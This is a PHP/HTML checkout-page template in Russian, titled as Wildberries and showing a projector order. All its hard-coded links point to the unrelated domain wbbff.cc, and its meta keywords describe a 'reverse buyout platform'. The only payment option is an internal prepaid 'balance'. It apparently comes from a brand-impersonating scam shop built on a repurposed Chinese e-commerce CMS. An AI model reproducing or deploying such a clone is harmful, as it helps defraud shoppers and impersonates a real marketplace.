<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina"><head><style>:root {

--image-path: url('<?php echo asset("/assets/foot_nav.png")?>');
--image-path2: url('<?php echo asset("/assets/dd_icon.png")?>');
}</style>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<title>Отправить заказ - Wildberries</title>
<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
<meta name="format-detection" content="telephone=no">
<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style_002.css")?>">
<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">

<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/arttpl.js")?>"></script>
<link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss"></head>
<body style="overflow-y: auto;">

<script type="text/javascript">
page_loading();
</script>
<div class="pagetop">
	<div class="fh"><a href="javascript:app_open('back');"></a></div>
	<div>Отправить заказ</div>
		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
	
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
	</ul>
	<div class="clear"></div>
</div></div>
<div class="wgw_box" style="display: none;">
	<div class="wgw_btn"></div>
	<div class="mat20 font16 c666">В корзине пока пусто</div>
	<div class="g_btn"><a href="<?php  echo route("index") ?>">Перейти на главную</a></div>
</div>
<form method="post" id="form">
<div class="content" style="">

	<div class="dingdan_info">
				<div class="js_cart dd_box1" id="315">
			<div class="dingdan_img" style="left:10px;"><img src="<?php echo asset("assets/thumb_400x400_2023111218541916957o.png")?>"></div>
			<div class="dingdan_name" style="margin-left:90px;">
				<p style="height:40px; overflow:hidden;"><a href="https://wbbff.cc/index.php/product/214" title="Wanb / Проектор Wanbo T2 Max New (белый)">Wanb / Проектор Wanbo T2 Max New (белый)</a></p>
				<p class="c888 font12"></p>
				<div class="order_r">
					<p class="num fl corg font14">₽ 19980</p>
					<p class="fr">×1</p>
					<div class="clear"></div>
				</div>
			</div>
			<div class="clear"></div>
		</div>
		<div class="xuxian2"></div>
			</div>
	<div class="yhq_box">
		<div class="yhq_sel">
			<span class="fl c666">сумма заказа:</span>
			<span class="fr">₽ <span id="order_product_money">19980.0</span></span>
			<div class="clear"></div>
		</div>
		<div class="yhq_sel">
			<span class="fl c666">груз заказа:</span>
			<span class="fr">₽ <span id="order_wl_money">0.0</span></span>
			<div class="clear"></div>
		</div>
<!-- 		<div class="yhq_sel">
			<span class="fl c666">店铺优惠：</span>
			<span class="fr r_jt" onclick="app_page('page_quan')" style="position:relative">
				<span id="quan_btn" style="padding-right:15px; color:#666">不使用优惠券</span>
				<input type="hidden" name="order_quan_id" />
				<span id="order_quan_money" class="divhide">0.0</span><i></i>
			</span>
			<div class="clear"></div>
		</div> -->
				<div class="yhq_sel" style="border-bottom:0">
			<span class="fl c666">Общая сумма:</span>
			<span class="fr corg font16">₽ <span class="order_money">19980.0</span></span>
			<div class="clear"></div>
		</div>
	</div>
	<div class="yhq_box">
		<div class="yhq_sel" onclick="app_page('page_payment')">
			<span class="fl c666">способ оплаты:</span>
			<span class="fr r_jt" style="position:relative">
				<span id="payment_btn" style="padding-right:15px; color:#666">balance</span><i></i>
			</span>
			<div class="clear"></div>
		</div>
<!-- 		<div class="yhq_sel1" style="border-bottom:0">
			<span class="yhq_sel1_l c666">订单留言：</span>
		</div> -->
	</div>
	<div style="margin-bottom:60px;"></div>
	<div class="add_tj">
		<div class="fl mal10 c666">Всего：<span class="corg font16">₽ <span class="order_money">19980.0</span></span></div>
		<div class="add_tjbtn">
			<input type="hidden" name="address_id" value="833">
			<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
			<input type="hidden" name="pesubmit">	
				<input type="hidden" id="oid" name="oid">	
			<input type="button" id="order_btn" value="Отправить заказ">
		</div>
	</div>
</div>
<div id="page_useraddr" class="divhide">
	<div class="add_tt">选择收货地址</div>
	<div class="close_btn" onclick="app_page_close();"></div>
	<div class="dddz_html" id="useraddr_html">
		
		<div class="add_sel js_radio sel" val="833" onclick="useraddr_select('833')">	
			<div class="dui_1"></div>
			<!--<div class="edit_add"></div>-->
			<div class="font14 c333">fdfads，79432412441</div>
			<div class="mat5 c999">收货地址：   fasdfa</div>
		</div>
		</div>
	<a class="add_xj" href="javascript:app_page_close();app_iframe('https://wbbff.cc/index.php?mod=useraddr&amp;act=add');"><i class="add_jia"></i><i class="jt_r"></i>新建地址</a>
</div>
<div id="page_quan" class="divhide">
	<div class="add_tt">选择优惠券</div>
	<div class="close_btn" onclick="app_page_close();"></div>
	<div class="quan_sel">
	<label class="add_sel js_radio mal10 sel" for="order_quan_0">
		<input type="radio" name="order_quan_id" value="0" id="order_quan_0" class="divhide" quan_money="0.0" quan_name="不使用优惠券" checked="checked">
		不使用优惠券<div class="dui_1"></div>
	</label>
		</div>
</div>
<div id="page_point" class="divhide">
	<div class="add_tt">使用积分抵扣</div>
	<div class="close_btn" onclick="app_page_close();"></div>
	<div class="quan_tc">
		<div class=""><span class="c888">积分баланс:</span>0个，可抵扣：0RUB</div>
		<div class="mat20">
			<span class="fl c888" style="margin-top:3px">本次使用：</span>
			<div class="quan_input fl"><input type="text" name="order_point_use" value="0" class="quan_input"> <span class="c888">积分</span></div>
			<div class="clear"></div>
			<a href="javascript:;" id="point_usebtn" class="tjbtn" style="margin-top:40px">确认使用</a>
			<div class="clear"></div>
		</div>
	</div>
</div>
<div id="page_payment" class="divhide">
	<div class="add_tt">Выберите способ оплаты</div>
	<div class="close_btn" onclick="app_page_close();"></div>
	<div>
				<label class="add_sel js_radio sel" for="order_payment_balance">
			<input type="radio" name="order_payment" value="balance" payment_name="balance" id="order_payment_balance" class="divhide" checked="checked">
			<div class="fl mar5" style="width:22px; overflow:hidden;"><img src="<?php echo asset("assets/logo.png")?>" width="85"></div>
			<div class="fl mat2">balance</div>
						<div class="fl mat2 corg">（баланс:0.0RUB）</div>
						<div class="dui_1"></div>
			<div class="clear"></div>
		</label>
			</div>
</div>
</form>
<script type="text/javascript">
$(function(){
	cart_check();
	useraddr_list(0);
	//支付方式
	pe_select_radio('order_payment', $(":input[name='order_payment']:eq(0)").val(), function(json){
		$("#payment_btn").html($(":input[name='order_payment']:checked").attr("payment_name"));
		app_page_close();
	});
	//选择优惠券
	var quan_id = $(":input[name='order_quan_id']").length > 1 ? $(":input[name='order_quan_id']:eq(1)").val() : 0;
	pe_select_radio('order_quan_id', quan_id, function(json){
		$("#order_quan_money").html($(":input[name='order_quan_id']:checked").attr("quan_money"));
		$("#quan_btn").html($(":input[name='order_quan_id']:checked").attr("quan_name"));
		order_money();
		app_page_close();
	});
	//使用积分
	$(":input[name='order_point_use']").keyup(function(){
		var point = pe_num($(this).val(), 'floor');
		if (point > 0) {
			point = 0;
		}
		$(this).val(point);
	})
	$("#point_usebtn").click(function(){
		var point = pe_num($(":input[name='order_point_use']").val(), 'floor');
		var point_money = '0.0';
		if (0 > 0) {
			point_money = pe_num(point/0, 'floor', 1, true);
		}
		if (point) {
			$("#point_btn").html("省"+point_money+"RUB：使用"+point+"积分");
		}
		else {
			$("#point_btn").html("不使用积分");		
		}
		$("#order_point_money").html(point_money);
		order_money();
		app_page_close();
	})
	$("#order_btn").click(function(){
	   // alert($(" input[ name='oid' ] ").val())
		app_submit("<?php echo route("order") ?>53411", function(json){
			if (json.result) app_open(json.url, 1000);
		})
	})
})

 var url = window.location.href;
// console.log(getQueryVariable(url,'oid'))
if (getQueryVariable(url,'oid')!='') {
      $(":input[name='oid']").val(getQueryVariable(url,'oid'));
}
function getQueryVariable(url, value) {
  var query = url.split("?")[1];

  var vars = query.split("&");
  for (var i = 0; i < vars.length; i++) {
    var pair = vars[i].split("=");
    
    if (pair[0] == value) {
       
      return pair[1];
    }
  }
  return '';
}
//购物车初始化
function cart_check() {
	if ($(".js_cart").length == 0) {
		$(".wgw_box").show();
		$(".content").hide();
	}
	else {
		$(".wgw_box").hide();
		$(".content").show();	
	}
}
//获取收货地址
function useraddr_list() {
	pe_getinfo("https://wbbff.cc/index.php?mod=useraddr", function(json){
		if (json.result) {
			$("#useraddr_html").html(template('useraddr_tpl', json));
		}
		if (typeof(json.info.address_id) != 'undefined') {
			$(":input[name='address_id']").val(json.info.address_id);
			$("#useraddr_btn").hide();
			$("#useraddr_sel_html").html(template('useraddr_sel_tpl', json));
			$("#useraddr_html .js_radio").removeClass("sel");
			$("#useraddr_html .js_radio[val='"+json.info.address_id+"']").addClass("sel");
		}
	});
}
//选择收货地址
function useraddr_select(id) {
	pe_getinfo("https://wbbff.cc/index.php?mod=useraddr&id="+id, function(json){
		if (typeof(json.info.address_id) != 'undefined') {
			$(":input[name='address_id']").val(id);
			$("#useraddr_btn").hide();
			$("#useraddr_sel_html").html(template('useraddr_sel_tpl', json));
			$("#useraddr_html .js_radio").removeClass("sel");
			$("#useraddr_html .js_radio[val='"+json.info.address_id+"']").addClass("sel");
			app_page_close();
		}
	});
}
//订单金额
function order_money() {
	var product_money = pe_num($("#order_product_money").html(), 'round', 1);
	var wl_money = pe_num($("#order_wl_money").html(), 'round', 1);
	var quan_money = pe_num($("#order_quan_money").html(), 'round', 1);
	var point_money = pe_num($("#order_point_money").html(), 'round', 1);
	var order_money = product_money + wl_money - quan_money - point_money;
	order_money = order_money >= 0 ? order_money : 0;
	$(".order_money").html(pe_num(order_money, 'round', 1, true));
}
</script>

<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css")?>">
<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css")?>">
<script src="<?php echo asset("assets/jquery-weui.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/jquery.scrollLoading.js")?>"></script>
<script type="text/javascript">
$(function(){
	$("img.js_imgload").scrollLoading();
});
//顶部菜单点击
function top_menu() {
	if ($("#top_menu").is(":hidden")) {
		$("#top_menu").show();
	}
	else {
		$("#top_menu").hide();	
	}
	$("#top_menu a").live("click", function(){
		$("#top_menu").hide();
	})
}
pe_loadscript("https://wbbff.cc/api.php?mod=cron");
</script>

</body></html>